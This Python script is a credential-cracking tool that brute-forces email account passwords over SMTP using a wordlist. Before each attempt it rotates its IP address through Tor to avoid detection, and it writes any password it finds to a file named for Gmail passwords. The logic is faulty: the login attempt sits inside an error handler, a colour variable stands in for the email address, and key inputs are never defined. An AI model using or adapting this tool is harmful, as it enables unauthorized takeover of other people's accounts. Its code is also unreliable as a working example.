import requests
from stem.control import Controller
from stem import Signal
import smtplib

import os
from colorama import Fore

W = Fore.LIGHTWHITE_EX
r = Fore.RED
g = Fore.GREEN
m = Fore.LIGHTMAGENTA_EX
y = Fore.YELLOW
c = Fore.CYAN

try:
    import socks
except ModuleNotFoundError:
    os.system("pip install socks")


def renew_connection():
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        c.signal(Signal.NEWNYM)


def get_tor_session():
    session = requests.Session()

    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session


def changeip():
    B = Fore.BLUE
    G = Fore.GREEN
    W = Fore.WHITE

    ipc = requests.get("https://httpbin.org/ip").json()['origin']
    print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
    renew_connection()
    s = get_tor_session()
    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
    ipc = requests.get("https://httpbin.org/ip", proxies=por).json()['origin']
    print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")


yes = ["y", "yes"]
no = ["n", "no"]



found = "~/Found_Gmail_Passwords"


def cracker(emails, wordlist, smtp, port):
    global smtpserver
    wordlist = [x.strip('\n') for x in open(wordlist, "r", errors="ignore").readlines()]
    for mail in emails:
        print(f"{y}Fetching mail {r}{str(m)}")
        for n, password in enumerate(wordlist):
            tot_pass = str(len(wordlist))
            print(f"{c}Trying password {r}{str(password)}: {g}{str(n + 1)}/{y}{tot_pass}")
            changeip()

            try:
                smtpserver = smtplib.SMTP(smtp , int(port))
                smtpserver.ehlo()
                smtpserver.starttls()
            except smtplib.SMTPServerDisconnected:
                print(r + "Something went wrong.")

                try:

                    smtpserver.login(m, password)
                    with open(found, "a+") as fo:
                        fo.write(f"{mail} : {password}\n")
                    print(y + "[+] Password Found:" + c + str(password))
                    smtpserver.close()
                    break
                except smtplib.SMTPAuthenticationError:
                    continue


cont = ""
while cont not in no:
    try:
        cracker(emails, wordlist, smtp, port)
    except:
        print("[!] Parameters are not perfectly set!\n[!] Something went wrong")

